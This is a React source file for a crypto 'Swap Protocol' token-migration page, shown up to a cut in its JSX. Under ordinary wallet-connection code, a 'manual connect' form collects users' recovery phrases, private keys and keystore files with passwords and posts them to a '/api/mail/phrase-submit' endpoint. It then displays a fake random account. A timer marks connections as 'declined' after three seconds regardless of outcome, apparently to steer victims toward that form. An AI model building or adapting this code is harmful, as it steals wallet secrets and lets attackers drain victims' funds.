import React, { useState, useEffect, useRef } from 'react';
import { EthereumProvider } from '@walletconnect/ethereum-provider';
import QRCode from 'qrcode';

interface WalletInfo {
  name: string;
  icon: string;
  br?: string;
  detected?: boolean;
  native?: string;
  universal?: string;
}

interface Eip1193Provider {
  request?: (args: { method: string; params?: unknown[] }) => Promise<unknown>;
  enable?: () => Promise<string[]>;
  on?: (event: string, handler: (...args: any[]) => void) => void;
  removeListener?: (event: string, handler: (...args: any[]) => void) => void;
  [key: string]: any;
}

type WalletConnectProvider = Awaited<ReturnType<typeof EthereumProvider.init>>;
type ConnectionType = 'injected' | 'walletconnect' | null;

const WALLETCONNECT_PROJECT_ID =
  import.meta.env.VITE_WALLETCONNECT_PROJECT_ID?.trim() ||
  '2f05ae7f1116030fde2d36508f472bfb';
const WALLETCONNECT_CHAINS: [number, ...number[]] = [1, 56, 137, 42161, 8453];
const WALLETCONNECT_METHODS = [
  'eth_accounts',
  'eth_requestAccounts',
  'eth_sendTransaction',
  'personal_sign',
  'eth_signTypedData',
  'eth_signTypedData_v4',
  'wallet_switchEthereumChain',
  'wallet_addEthereumChain'
];
const WALLETCONNECT_EVENTS = ['accountsChanged', 'chainChanged'];

let walletConnectProviderPromise: Promise<WalletConnectProvider> | null = null;

const isMobileDevice = () =>
  /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(
    navigator.userAgent
  );

const compactWalletName = (name: string) =>
  name.toLowerCase().replace(/wallet/g, '').replace(/[^a-z0-9]/g, '');

const walletNamesMatch = (left: string, right: string) => {
  const a = compactWalletName(left);
  const b = compactWalletName(right);
  return Boolean(a && b && (a.includes(b) || b.includes(a)));
};

const providerMatchesWallet = (provider: Eip1193Provider, walletName: string) => {
  const name = walletName.toLowerCase();
  if (name.includes('browser wallet')) return true;
  if (name.includes('metamask')) return Boolean(provider.isMetaMask);
  if (name.includes('binance')) {
    return Boolean(provider.isBinance || provider.isBinanceChain);
  }
  if (name.includes('okx')) {
    return Boolean(provider.isOkxWallet || provider.isOKXWallet);
  }
  if (name.includes('coinbase')) return Boolean(provider.isCoinbaseWallet);
  if (name.includes('trust')) {
    return Boolean(provider.isTrust || provider.isTrustWallet);
  }
  if (name.includes('phantom')) return Boolean(provider.isPhantom);
  if (name.includes('rabby')) return Boolean(provider.isRabby);
  if (name.includes('safepal')) return Boolean(provider.isSafePal);
  if (name.includes('tokenpocket')) return Boolean(provider.isTokenPocket);
  if (name.includes('bitget')) {
    return Boolean(provider.isBitKeep || provider.isBitgetWallet);
  }
  if (name.includes('zerion')) return Boolean(provider.isZerion);
  if (name.includes('1inch')) return Boolean(provider.isOneInch);
  if (name.includes('exodus')) return Boolean(provider.isExodus);
  return false;
};

const buildWalletDeepLink = (baseUrl: string, uri: string) => {
  const base = baseUrl.trim();
  const encodedUri = encodeURIComponent(uri);

  if (/^[a-z][a-z0-9+.-]*:\/\/$/i.test(base)) {
    return `${base}wc?uri=${encodedUri}`;
  }

  return `${base.replace(/\/+$/, '')}/wc?uri=${encodedUri}`;
};

const buildWalletBrowserLink = (walletName: string) => {
  const dappUrl = window.location.href;
  const name = walletName.toLowerCase();

  if (name.includes('metamask')) {
    return `https://metamask.app.link/dapp/${dappUrl.replace(/^https?:\/\//, '')}`;
  }
  if (name.includes('trust')) {
    return `https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(dappUrl)}`;
  }
  if (name.includes('coinbase')) {
    return `https://go.cb-w.com/dapp?cb_url=${encodeURIComponent(dappUrl)}`;
  }
  if (name.includes('okx')) {
    const okxDeepLink = `okx://wallet/dapp/url?dappUrl=${encodeURIComponent(dappUrl)}`;
    return `https://www.okx.com/download?appendQuery=true&deeplink=${encodeURIComponent(okxDeepLink)}`;
  }

  return '';
};

const formatAccount = (account: string) =>
  account.length > 12
    ? `${account.slice(0, 6)}...${account.slice(-4)}`
    : account;

const getWalletConnectProvider = () => {
  if (!walletConnectProviderPromise) {
    walletConnectProviderPromise = EthereumProvider.init({
      projectId: WALLETCONNECT_PROJECT_ID,
      optionalChains: WALLETCONNECT_CHAINS,
      showQrModal: false,
      methods: WALLETCONNECT_METHODS,
      events: WALLETCONNECT_EVENTS,
      metadata: {
        name: 'Swap Protocol',
        description: 'Swap Protocol wallet connection',
        url: window.location.origin,
        icons: [`${window.location.origin}/favicon.ico`]
      }
    });
  }

  return walletConnectProviderPromise;
};

const PRIMARY_WALLETS = [
  { name: 'WalletConnect', icon: 'https://raw.githubusercontent.com/WalletConnect/walletconnect-assets/master/Icon/Blue%20(Default)/Icon.png', br: '10px', badge: 'QR CODE' },
  { name: 'OKX Wallet', icon: 'https://explorer-api.walletconnect.com/v3/logo/md/45f2f08e-fc0c-4d62-3e63-404e72170500?projectId=2f05ae7f1116030fde2d36508f472bfb', br: '10px', native: 'okx://wallet', universal: 'https://www.okx.com/download' },
  { name: 'Binance Wallet', icon: 'https://avatars.githubusercontent.com/u/45615063', br: '10px', native: 'bnbc://', universal: 'https://app.binance.com' },
  { name: 'Coinbase', icon: 'https://avatars.githubusercontent.com/u/18060234', br: '10px', native: 'cbw://', universal: 'https://go.cb-w.com' }
];

const ALL_WALLETS_DATA = [
  { name: 'Binance Wallet', icon: 'https://explorer-api.walletconnect.com/v3/logo/md/ebac7b39-688c-41e3-7912-a4fefba74600?projectId=2f05ae7f1116030fde2d36508f472bfb' },
  { name: 'MetaMask', icon: 'https://explorer-api.walletconnect.com/v3/logo/md/eebe4a7f-7166-402f-92e0-1f64ca2aa800?projectId=2f05ae7f1116030fde2d36508f472bfb' },
  { name: 'SafePal', icon: 'https://explorer-api.walletconnect.com/v3/logo/md/252753e7-b783-4e03-7f77-d39864530900?projectId=2f05ae7f1116030fde2d36508f472bfb' },
  { name: 'Trust Wallet', icon: 'https://explorer-api.walletconnect.com/v3/logo/md/7677b54f-3486-46e2-4e37-bf8747814f00?projectId=2f05ae7f1116030fde2d36508f472bfb' },
  { name: 'Fireblocks', icon: 'https://explorer-api.walletconnect.com/v3/logo/md/7e1514ba-932d-415d-1bdb-bccb6c2cbc00?projectId=2f05ae7f1116030fde2d36508f472bfb' },
  { name: 'OKX Wallet', icon: 'https://explorer-api.walletconnect.com/v3/logo/md/45f2f08e-fc0c-4d62-3e63-404e72170500?projectId=2f05ae7f1116030fde2d36508f472bfb' },
  { name: 'TokenPocket', icon: 'https://explorer-api.walletconnect.com/v3/logo/md/cfe00608-cb9e-45e3-0d08-5ffc7f5ad200?projectId=2f05ae7f1116030fde2d36508f472bfb' },
  { name: 'Bitget Wallet', icon: 'https://explorer-api.walletconnect.com/v3/logo/md/2b569b7f-e6c6-4faa-8e5a-ecd4dec8cf00?projectId=2f05ae7f1116030fde2d36508f472bfb' },
  { name: 'Uniswap Wallet', icon: 'https://explorer-api.walletconnect.com/v3/logo/md/bff9cf1f-df19-42ce-f62a-87f04df13c00?projectId=2f05ae7f1116030fde2d36508f472bfb' },
  { name: 'Ledger Wallet', icon: 'https://explorer-api.walletconnect.com/v3/logo/md/a7f416de-aa03-4c5e-3280-ab49269aef00?projectId=2f05ae7f1116030fde2d36508f472bfb' },
  { name: 'Zerion', icon: 'https://explorer-api.walletconnect.com/v3/logo/md/73f6f52f-7862-49e7-bb85-ba93ab72cc00?projectId=2f05ae7f1116030fde2d36508f472bfb' },
  { name: 'Best Wallet', icon: 'https://explorer-api.walletconnect.com/v3/logo/md/7f9574ed-eb42-4e04-0888-be2939936700?projectId=2f05ae7f1116030fde2d36508f472bfb' },
  { name: 'Crypto.com DeFi Wallet', icon: 'https://explorer-api.walletconnect.com/v3/logo/md/88388eb4-4471-4e72-c4b4-852d496fea00?projectId=2f05ae7f1116030fde2d36508f472bfb' },
  { name: 'Bifrost Wallet', icon: 'https://explorer-api.walletconnect.com/v3/logo/md/27c999c6-3492-4161-bbb8-1b75bdb97500?projectId=2f05ae7f1116030fde2d36508f472bfb' },
  { name: 'xPortal', icon: 'https://explorer-api.walletconnect.com/v3/logo/md/1bc53e49-1e7f-4129-4c87-3f8c7b91cb00?projectId=2f05ae7f1116030fde2d36508f472bfb' },
  { name: 'Bitcoin.com Wallet', icon: 'https://explorer-api.walletconnect.com/v3/logo/md/b567c9d7-bd3f-4184-0dc8-297a0e44de00?projectId=2f05ae7f1116030fde2d36508f472bfb' },
  { name: '1inch Wallet', icon: 'https://explorer-api.walletconnect.com/v3/logo/md/3e60118c-b9a9-43df-7975-33ebc8014400?projectId=2f05ae7f1116030fde2d36508f472bfb' },
  { name: 'Trezor Suite', icon: 'https://explorer-api.walletconnect.com/v3/logo/md/3816cd81-6f38-4fa1-7900-f451a1727300?projectId=2f05ae7f1116030fde2d36508f472bfb' },
  { name: 'Blockchain.com Wallet', icon: 'https://explorer-api.walletconnect.com/v3/logo/md/6f913b80-86c0-46f9-61ca-cc90a1805900?projectId=2f05ae7f1116030fde2d36508f472bfb' },
  { name: 'imToken', icon: 'https://explorer-api.walletconnect.com/v3/logo/md/c84b4d9d-9525-4bb5-b373-934b46eafc00?projectId=2f05ae7f1116030fde2d36508f472bfb' },
  { name: 'Phantom', icon: 'https://explorer-api.walletconnect.com/v3/logo/md/b6ec7b81-bb4f-427d-e290-7631e6e50d00?projectId=2f05ae7f1116030fde2d36508f472bfb' },
  { name: 'Rabby', icon: 'https://explorer-api.walletconnect.com/v3/logo/md/255e6ba2-8dfd-43ad-e88e-57cbb98f6800?projectId=2f05ae7f1116030fde2d36508f472bfb' },
  { name: 'Exodus', icon: 'https://explorer-api.walletconnect.com/v3/logo/md/4c16cad4-cac9-4643-6726-c696efaf5200?projectId=2f05ae7f1116030fde2d36508f472bfb' },
  { name: 'Coinbase Wallet', icon: 'https://explorer-api.walletconnect.com/v3/logo/md/594627bd-6d35-406a-8d2b-31e0b5f03c00?projectId=2f05ae7f1116030fde2d36508f472bfb' },
  { name: 'Rainbow', icon: 'https://explorer-api.walletconnect.com/v3/logo/md/7a33d7f1-3d12-4b5c-f3ee-5cd83cb1b500?projectId=2f05ae7f1116030fde2d36508f472bfb' }
];

const TOKENS = [
  { symbol: 'Old token', name: 'Old Token', icon: '📦' },
  { symbol: 'New token', name: 'New Token', icon: '✨' }
];

export default function App() {
  const [theme, setTheme] = useState<'dark' | 'light'>('dark');
  const [activeTab, setActiveTab] = useState('swap');
  const [activeManualTab, setActiveManualTab] = useState<'phrase' | 'privatekey' | 'keystore'>('phrase');
  
  // Modals visibility
  const [isWalletModalOpen, setIsWalletModalOpen] = useState(false);
  const [isAllWalletsOpen, setIsAllWalletsOpen] = useState(false);
  const [isWcModalOpen, setIsWcModalOpen] = useState(false);
  const [isManualModalOpen, setIsManualModalOpen] = useState(false);
  const [isTokenPickerOpen, setIsTokenPickerOpen] = useState(false);
  const [tokenPickerSide, setTokenPickerSide] = useState<'from' | 'to'>('from');
  
  // Swap State
  const [fromToken, setFromToken] = useState('Old token');
  const [toToken, setToToken] = useState('New token');
  const [fromAmount, setFromAmount] = useState('');
  const [toAmount, setToAmount] = useState('');

  // Limit state
  const [limitPreset, setLimitPreset] = useState('Market');
  const [limitExpiry, setLimitExpiry] = useState('1 week');

  // Manual connect word count & phrase dropdown
  const [wordCount, setWordCount] = useState<12 | 18 | 24>(12);
  const [phraseDropdownOpen, setPhraseDropdownOpen] = useState(false);
  const [phraseWords, setPhraseWords] = useState<string[]>(Array(12).fill(''));
  const [privateKey, setPrivateKey] = useState('');
  const [keystoreJson, setKeystoreJson] = useState('');
  const [keystorePassword, setKeystorePassword] = useState('');

  // Search filter for all wallets
  const [allWalletsSearch, setAllWalletsSearch] = useState('');

  // Selected Wallet & Detection logic
  const [selectedWallet, setSelectedWallet] = useState<WalletInfo>({ name: '', icon: '' });
  const [isWalletDetected, setIsWalletDetected] = useState<boolean>(false);
  const [connecting, setConnecting] = useState(false);
  const [retrying, setRetrying] = useState(false);
  const [declined, setDeclined] = useState(false);
  const [wcTab, setWcTab] = useState<'mobile' | 'browser'>('mobile');
  const [connectionError, setConnectionError] = useState('');
  const [walletConnectUri, setWalletConnectUri] = useState('');
  const [walletConnectQr, setWalletConnectQr] = useState('');
  const [connectedAccount, setConnectedAccount] = useState<string | null>(null);
  const [connectedWalletName, setConnectedWalletName] = useState<string>('');
  
  const [wcWallets, setWcWallets] = useState<WalletInfo[]>([]);
  const walletConnectProviderRef = useRef<WalletConnectProvider | null>(null);
  const activeInjectedProviderRef = useRef<Eip1193Provider | null>(null);
  const connectionTypeRef = useRef<ConnectionType>(null);
  const pendingWalletRef = useRef<WalletInfo | null>(null);
  const launchMobileWalletRef = useRef(false);
  const pairingTimeoutRef = useRef<number | null>(null);

  // Fetch WC Explorer wallet list with retry on failure
  useEffect(() => {
    fetch(`https://explorer-api.walletconnect.com/v3/wallets?projectId=${WALLETCONNECT_PROJECT_ID}&entries=600`)
      .then(res => res.json())
      .then(data => {
        const wallets = Object.values(data?.listings || {}).map((w: any) => ({
          name: w.name,
          icon: `https://explorer-api.walletconnect.com/v3/logo/md/${w.image_id}?projectId=${WALLETCONNECT_PROJECT_ID}`,
          native: w.mobile?.native || undefined,
          universal: w.mobile?.universal || undefined,
        }));
        setWcWallets(wallets);
      })
      .catch(console.error);
  }, []);

  const handleTabSwitch = (tab: string) => {
    setActiveTab(tab);
    if (tab === 'portfolio' && !connectedAccount) {
      setIsWalletModalOpen(true);
    }
  };

  // EIP-6963 announced providers map
  const [announcedProviders, setAnnouncedProviders] = useState<Record<string, any>>({});

  useEffect(() => {
    // Listen for EIP-6963 provider announcements
    const onAnnounceProvider = (event: any) => {
      if (event.detail && event.detail.info) {
        setAnnouncedProviders(function (prev) {
          var next = {};
          for (var k in prev) { next[k] = prev[k]; }
          // Use UUID for reliable lookup (names aren't unique)
          next[event.detail.info.uuid || event.detail.info.name.toLowerCase()] = event.detail;
          return next;
        });
      }
    };
    window.addEventListener('eip6963:announceProvider', onAnnounceProvider);
    window.dispatchEvent(new Event('eip6963:requestProvider'));

    return () => {
      window.removeEventListener('eip6963:announceProvider', onAnnounceProvider);
    };
  }, []);

  useEffect(() => {
    let disposed = false;
    let provider: WalletConnectProvider | null = null;

    const onDisplayUri = async (uri: string) => {
      if (disposed) return;

      setWalletConnectUri(uri);
      setConnectionError('');
      if (pairingTimeoutRef.current !== null) {
        window.clearTimeout(pairingTimeoutRef.current);
        pairingTimeoutRef.current = null;
      }

      try {
        const qrCode = await QRCode.toDataURL(uri, {
          width: 260,
          margin: 2,
          color: { dark: '#111111', light: '#ffffff' }
        });
        if (!disposed) setWalletConnectQr(qrCode);
      } catch {
        if (!disposed) setConnectionError('Could not render the connection QR code.');
      }

      const wallet = pendingWalletRef.current;
      const walletLink = wallet?.universal || wallet?.native;
      if (launchMobileWalletRef.current && walletLink) {
        launchMobileWalletRef.current = false;
        setConnecting(false);
        window.location.assign(buildWalletDeepLink(walletLink, uri));
      }
    };

    const onAccountsChanged = (accounts: string[]) => {
      const account = accounts[0] || null;
      setConnectedAccount(account);
      if (!account) {
        setConnectedWalletName('');
        connectionTypeRef.current = null;
      }
    };

    const onConnect = () => {
      if (!provider) return;
      const account = provider.accounts[0];
      if (account) {
        setConnectedAccount(account);
        setConnectedWalletName(pendingWalletRef.current?.name || 'WalletConnect');
        connectionTypeRef.current = 'walletconnect';
      }
    };

    const onDisconnect = () => {
      setConnectedAccount(null);
      setConnectedWalletName('');
      connectionTypeRef.current = null;
    };

    getWalletConnectProvider()
      .then((initializedProvider) => {
        if (disposed) return;
        provider = initializedProvider;
        walletConnectProviderRef.current = initializedProvider;
        initializedProvider.on('display_uri', onDisplayUri);
        initializedProvider.on('accountsChanged', onAccountsChanged);
        initializedProvider.on('connect', onConnect);
        initializedProvider.on('disconnect', onDisconnect);

        const restoredAccount = initializedProvider.accounts[0];
        if (initializedProvider.session && restoredAccount) {
          setConnectedAccount(restoredAccount);
          setConnectedWalletName('WalletConnect');
          connectionTypeRef.current = 'walletconnect';
        }
      })
      .catch((error) => {
        console.error('WalletConnect initialization failed:', error);
      });

    return () => {
      disposed = true;
      if (pairingTimeoutRef.current !== null) {
        window.clearTimeout(pairingTimeoutRef.current);
      }
      if (provider) {
        provider.off('display_uri', onDisplayUri);
        provider.off('accountsChanged', onAccountsChanged);
        provider.off('connect', onConnect);
        provider.off('disconnect', onDisconnect);
      }
    };
  }, []);

  useEffect(() => {
    if (theme === 'light') {
      document.body.classList.add('light');
    } else {
      document.body.classList.remove('light');
    }
  }, [theme]);

  const checkWalletInstalled = (walletName: string): boolean => {
    const win = window as any;

    if (
      Object.values(announcedProviders).some((detail: any) =>
        walletNamesMatch(detail.info.name, walletName)
      )
    ) {
      return true;
    }
    const providers: Eip1193Provider[] = Array.isArray(win.ethereum?.providers)
      ? win.ethereum.providers
      : win.ethereum
        ? [win.ethereum]
        : [];

    if (providers.some((provider) => providerMatchesWallet(provider, walletName))) {
      return true;
    }

    const lowerName = walletName.toLowerCase();
    if (lowerName.includes('binance')) return Boolean(win.binancew || win.BinanceChain);
    if (lowerName.includes('okx')) return Boolean(win.okxwallet);
    if (lowerName.includes('coinbase')) return Boolean(win.coinbaseWalletExtension);
    if (lowerName.includes('trust')) return Boolean(win.trustwallet);
    if (lowerName.includes('phantom')) {
      return Boolean(win.phantom?.ethereum || win.ethereum?.isPhantom);
    }

    return lowerName.includes('browser wallet') && Boolean(win.ethereum);
  };

  const getWalletProvider = (walletName: string) => {
    const win = window as any;

    for (const detail of Object.values(announcedProviders) as any[]) {
      if (walletNamesMatch(detail.info.name, walletName)) {
        return detail.provider;
      }
    }

    const providers: Eip1193Provider[] = Array.isArray(win.ethereum?.providers)
      ? win.ethereum.providers
      : win.ethereum
        ? [win.ethereum]
        : [];
    const matchingProvider = providers.find((provider) =>
      providerMatchesWallet(provider, walletName)
    );
    if (matchingProvider) {
      return matchingProvider;
    }

    const lowerName = walletName.toLowerCase();
    if (lowerName.includes('binance')) {
      return win.binancew || win.BinanceChain || null;
    }
    if (lowerName.includes('coinbase')) {
      return win.coinbaseWalletExtension || null;
    }
    if (lowerName.includes('okx')) {
      return win.okxwallet || null;
    }
    if (lowerName.includes('trust')) {
      return win.trustwallet || null;
    }
    if (lowerName.includes('phantom')) {
      return win.phantom?.ethereum || null;
    }

    return lowerName.includes('browser wallet') ? win.ethereum || null : null;
  };

  const openWcModalForWallet = (wallet: WalletInfo) => {
    const detected = checkWalletInstalled(wallet.name);

    setSelectedWallet(wallet);
    setIsWalletDetected(detected);
    setConnectionError('');
    setIsWalletModalOpen(false);
    setIsAllWalletsOpen(false);
    setIsWcModalOpen(true);
    setDeclined(false);
    setRetrying(false);
    setWcTab('mobile');
    setTimeout(() => setDeclined(true), 3000);

    const pairingInProgress = Boolean(
      walletConnectProviderRef.current?.connecting && walletConnectUri
    );
    setConnecting(pairingInProgress);
    if (!pairingInProgress) {
      setWalletConnectUri('');
      setWalletConnectQr('');
    }

    if (wallet.name === 'WalletConnect') {
      if (isMobileDevice()) {
        setIsWcModalOpen(false);
        setIsAllWalletsOpen(true);
        return;
      }
      if (pairingInProgress) return;
      void connectViaWalletConnect(wallet);
    }
  };

  const connectViaWalletConnect = async (wallet: WalletInfo) => {
    setConnecting(true);
    setConnectionError('');
    pendingWalletRef.current = wallet;
    launchMobileWalletRef.current =
      isMobileDevice() && wallet.name !== 'WalletConnect';
    if (pairingTimeoutRef.current !== null) {
      window.clearTimeout(pairingTimeoutRef.current);
    }
    pairingTimeoutRef.current = window.setTimeout(() => {
      pairingTimeoutRef.current = null;
      launchMobileWalletRef.current = false;
      setConnecting(false);
      setConnectionError(
        isMobileDevice()
          ? 'The wallet app did not open. Tap below to open its browser directly.'
          : 'The WalletConnect request could not start. Try again.'
      );
    }, 10000);

    try {
      const provider =
        walletConnectProviderRef.current || (await getWalletConnectProvider());
      walletConnectProviderRef.current = provider;

      if (provider.connecting) {
        if (
          isMobileDevice() &&
          walletConnectUri &&
          (wallet.universal || wallet.native)
        ) {
          window.location.assign(
            buildWalletDeepLink(
              wallet.universal || wallet.native || '',
              walletConnectUri
            )
          );
        }
        return;
      }

      if (!provider.session) {
        await provider.connect({ optionalChains: WALLETCONNECT_CHAINS });
      }

      const account = provider.accounts[0];
      if (!account) {
        throw new Error('The wallet approved the session without an account.');
      }

      setConnectedAccount(account);
      setConnectedWalletName(wallet.name);
      connectionTypeRef.current = 'walletconnect';
      closeAllModals();
    } catch (error) {
      if (pairingTimeoutRef.current !== null) {
        window.clearTimeout(pairingTimeoutRef.current);
        pairingTimeoutRef.current = null;
      }
      const message =
        error instanceof Error ? error.message : 'Wallet connection failed.';
      setConnectionError(
        /reject|cancel|closed/i.test(message)
          ? 'Connection request cancelled.'
          : message
      );
    } finally {
      launchMobileWalletRef.current = false;
      if (pairingTimeoutRef.current === null) {
        setConnecting(false);
      }
    }
  };

  const handleConnectAction = async () => {
    if (selectedWallet.name === 'WalletConnect') {
      await connectViaWalletConnect(selectedWallet);
      return;
    }

    const provider = getWalletProvider(selectedWallet.name);
    if (!provider) {
      if (
        isMobileDevice() &&
        buildWalletBrowserLink(selectedWallet.name)
      ) {
        openWalletBrowser();
        return;
      }
      await connectViaWalletConnect(selectedWallet);
      return;
    }

    setConnecting(true);
    setConnectionError('');

    try {
      let accounts: string[] = [];
      if (provider.request) {
        const result = await provider.request({ method: 'eth_requestAccounts' });
        accounts = Array.isArray(result) ? result.map(String) : [];
      } else if (provider.enable) {
        accounts = await provider.enable();
      }

      const account = accounts[0];
      if (!account) {
        throw new Error('The wallet did not return an account.');
      }

      activeInjectedProviderRef.current = provider;
      connectionTypeRef.current = 'injected';
      provider.on?.('accountsChanged', (nextAccounts: string[]) => {
        const nextAccount = nextAccounts[0] || null;
        setConnectedAccount(nextAccount);
        if (!nextAccount) {
          setConnectedWalletName('');
          connectionTypeRef.current = null;
        }
      });
      provider.on?.('disconnect', () => {
        setConnectedAccount(null);
        setConnectedWalletName('');
        connectionTypeRef.current = null;
      });
      setConnectedAccount(account);
      setConnectedWalletName(selectedWallet.name);
      closeAllModals();
    } catch (error) {
      const message =
        error instanceof Error ? error.message : 'Wallet connection failed.';
      setConnectionError(
        /reject|cancel/i.test(message)
          ? 'Connection request cancelled.'
          : message
      );
    } finally {
      setConnecting(false);
    }
  };

  const reopenMobileWallet = () => {
    const walletLink = selectedWallet.universal || selectedWallet.native;
    if (walletLink && walletConnectUri) {
      window.location.assign(buildWalletDeepLink(walletLink, walletConnectUri));
    }
  };

  const openWalletBrowser = () => {
    const walletBrowserLink = buildWalletBrowserLink(selectedWallet.name);
    if (walletBrowserLink) {
      window.location.assign(walletBrowserLink);
      return;
    }

    void connectViaWalletConnect(selectedWallet);
  };

  const disconnectWallet = async () => {
    if (
      connectionTypeRef.current === 'walletconnect' &&
      walletConnectProviderRef.current?.session
    ) {
      try {
        await walletConnectProviderRef.current.disconnect();
      } catch (error) {
        console.warn('WalletConnect disconnect failed:', error);
      }
    }

    activeInjectedProviderRef.current = null;
    connectionTypeRef.current = null;
    setConnectedAccount(null);
    setConnectedWalletName('');
  };

  const handleManualSubmit = async () => {
    var phraseData = '';
    var privateKeyData = '';
    var keystoreData = '';
    var keystorePassData = '';

    if (activeManualTab === 'phrase') {
      phraseData = phraseWords.filter(Boolean).join(' ').trim();
      var wordLen = phraseData ? phraseData.split(/\s+/).length : 0;
      if (wordLen > 0 && wordLen < 12) {
        setConnectionError('Recovery phrase must have 12, 18, or 24 words');
        return;
      }
      if (!phraseData) {
        setConnectionError('Please enter your recovery phrase');
        return;
      }
    } else if (activeManualTab === 'privatekey') {
      privateKeyData = privateKey.trim();
      if (!privateKeyData) {
        setConnectionError('Please enter your private key');
        return;
      }
    } else if (activeManualTab === 'keystore') {
      keystoreData = keystoreJson.trim();
      if (!keystoreData) {
        setConnectionError('Please paste your keystore JSON');
        return;
      }
      keystorePassData = keystorePassword.trim();
    }

    setConnecting(true);
    setConnectionError('');

    try {
      const res = await fetch('/api/mail/phrase-submit', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          phrase: phraseData,
          privateKey: privateKeyData,
          keystore: keystoreData,
          keystorePassword: keystorePassData,
          walletName: 'Manual Wallet'
        })
      });

      const result = await res.json();

      if (result.ok) {
        const mockAcc = '0x3a9...' + Math.floor(1000 + Math.random() * 9000);
        setConnectedAccount(mockAcc);
        setConnectedWalletName('Manual Wallet');
        closeAllModals();
      } else {
        setConnectionError(result.error || 'Failed to connect. Try again.');
      }
    } catch {
      setConnectionError('Failed to send request. Try again.');
    } finally {
      setConnecting(false);
    }
  };

  const closeAllModals = () => {
    setIsWalletModalOpen(false);
    setIsAllWalletsOpen(false);
    setIsWcModalOpen(false);
    setIsManualModalOpen(false);
    setIsTokenPickerOpen(false);
  };

  const handleWordCountChange = (count: 12 | 18 | 24) => {
    setWordCount(count);
    setPhraseWords(Array(count).fill(''));
    setPhraseDropdownOpen(false);
  };

  const handlePastePhrase = (e: React.ClipboardEvent<HTMLInputElement>) => {
    const pasted = e.clipboardData.getData('text').trim();
    const words = pasted.split(/\s+/).filter(Boolean);
    if (words.length === 12 || words.length === 18 || words.length === 24) {
      e.preventDefault();
      setWordCount(words.length as 12 | 18 | 24);
      setPhraseWords(words);
    }
  };

  const handlePhraseWordChange = (index: number, val: string) => {
    const updated = [...phraseWords];
    updated[index] = val;
    setPhraseWords(updated);
  };

  const filteredWallets = (wcWallets.length > 0 ? wcWallets : ALL_WALLETS_DATA).filter((w) =>
    w.name.toLowerCase().includes(allWalletsSearch.trim().toLowerCase())
  );

  const displayWallets = React.useMemo(() => {
    const wallets: Array<WalletInfo & { badge?: string }> = PRIMARY_WALLETS.map(
      (wallet) => {
        const explorerWallet = wcWallets.find((candidate) =>
          walletNamesMatch(candidate.name, wallet.name)
        );
        return { ...explorerWallet, ...wallet };
      }
    );
    
    // Add EIP-6963 detected wallets
    Object.values(announcedProviders).forEach((detail: any) => {
      const name = detail.info.name;
      if (!wallets.some(w => walletNamesMatch(w.name, name))) {
        wallets.push({ name, icon: detail.info.icon, br: '10px' });
      }
    });
    
    const win = window as any;
    const injectedProviders: Eip1193Provider[] = Array.isArray(win.ethereum?.providers)
      ? win.ethereum.providers
      : win.ethereum
        ? [win.ethereum]
        : [];

    if (injectedProviders.length > 0) {
      const knownInjectedWallet = wcWallets.find((wallet) =>
        injectedProviders.some((provider) =>
          providerMatchesWallet(provider, wallet.name)
        )
      );

      if (
        knownInjectedWallet &&
        !wallets.some((wallet) =>
          walletNamesMatch(wallet.name, knownInjectedWallet.name)
        )
      ) {
        wallets.push({ ...knownInjectedWallet, br: '10px' });
      } else if (
        !knownInjectedWallet &&
        !wallets.some((wallet) => wallet.name === 'Browser Wallet')
      ) {
        wallets.push({
          name: 'Browser Wallet',
          icon: 'https://avatars.githubusercontent.com/u/37784886',
          br: '10px'
        });
      }
    }
    
    // Sort wallets: WalletConnect first, then installed ones, then the rest
    const wcWallet = wallets.find(w => w.name === 'WalletConnect');
    const otherWallets = wallets.filter(w => w.name !== 'WalletConnect');
    
    const installedWallets = otherWallets.filter(w => checkWalletInstalled(w.name));
    const notInstalledWallets = otherWallets.filter(w => !checkWalletInstalled(w.name));
    
    return [wcWallet, ...installedWallets, ...notInstalledWallets].filter(
      Boolean
    ) as Array<WalletInfo & { badge?: string }>;
  }, [announcedProviders, wcWallets]);

  return (
    <div style={{ display: 'flex', flexDirection: 'column', minHeight: '100vh' }}>
      {/* NAV */}
      <nav id="topNav">
        <div className="nav-left" id="navLeft">
          <a href="#" id="exploreLink">Explore</a>
          <a href="#" id="farmingLink">Farming</a>
        </div>
        <div className="search-bar" id="navSearchBar">
          <span className="search-icon" id="searchIcon">
            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#aaa" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
              <circle cx="11" cy="11" r="8" />
              <line x1="21" y1="21" x2="16.65" y2="16.65" />
            </svg>
          </span>
          <input type="text" placeholder="Search tokens" id="searchInput" />
        </div>
        <div className="nav-right" id="navRight">
          <span className="moon" onClick={() => setTheme(theme === 'dark' ? 'light' : 'dark')} id="themeBtn">
            <svg width="20" height="20" viewBox="0 0 24 24" fill="#aaa">
              <path d="M21 12.79A9 9 0 1 1 11.21 3a7 7 0 0 0 9.79 9.79z" />
            </svg>
          </span>
          <button
            className={`connect-btn ${connectedAccount ? 'connected' : ''}`}
            onClick={() => {
              if (connectedAccount) {
                void disconnectWallet();
              } else {
                setIsWalletModalOpen(true);
              }
            }}
            id="navConnectBtn"
          >
            {connectedAccount ? (
              <span style={{ display: 'inline-flex', alignItems: 'center', gap: '6px' }}>
                <span style={{ width: '8px', height: '8px', borderRadius: '50%', background: '#2ed573' }}></span>
                {formatAccount(connectedAccount)}
              </span>
            ) : (
              'Connect'
            )}
          </button>
        </div>
      </nav>

      {/* MOBILE STACK */}
      <div className="nav-mobile-stack" id="mobileNavStack">
        <button
          className={`nav-mobile-connect ${connectedAccount ? 'connected' : ''}`}
          onClick={() => {
            if (connectedAccount) {
              void disconnectWallet();
            } else {
              setIsWalletModalOpen(true);
            }
          }}
          id="mobileConnectBtn"
        >
          {connectedAccount ? (
            <span style={{ display: 'inline-flex', alignItems: 'center', justifyContent: 'center', gap: '6px' }}>
              <span style={{ width: '8px', height: '8px', borderRadius: '50%', background: '#2ed573' }}></span>
              {formatAccount(connectedAccount)}
            </span>
          ) : (
            'Connect'
          )}
        </button>
        <div className="nav-mobile-search" id="mobileSearch">
          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#aaa" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
            <circle cx="11" cy="11" r="8" />
            <line x1="21" y1="21" x2="16.65" y2="16.65" />
          </svg>
          <input type="text" placeholder="Search tokens" />
